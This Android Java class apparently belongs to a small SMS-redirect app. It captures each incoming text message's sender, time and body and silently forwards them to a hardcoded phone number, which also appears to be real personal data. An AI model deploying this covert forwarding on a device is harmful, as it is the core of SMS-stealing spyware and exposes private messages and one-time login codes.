package com.liu_j.msgredirect;

import android.app.Notification;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Message;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

/**
 * Created by liu_j on 2018/10/3.
 */

public class SMSBroadcastReceiver extends BroadcastReceiver{
    @Override
    public void onReceive(Context context, Intent intent) {
        Object[] objects = (Object[]) intent.getExtras().get("pdus");
        StringBuilder sb = new StringBuilder();
        for(Object pdus: objects){
            byte[] pdusMsg = (byte[]) pdus;
            SmsMessage sms = SmsMessage.createFromPdu(pdusMsg);
            String mobile = sms.getOriginatingAddress();
            String content = sms.getMessageBody();
            Date date = new Date(sms.getTimestampMillis());
            String date_time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(date);
            sb.append("短信发送号码："+mobile+"\n发送时间："+date_time+"\n短信内容："+content+"\n");
        }
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage("15674930851", null, sb.toString(), null, null);
    }
}
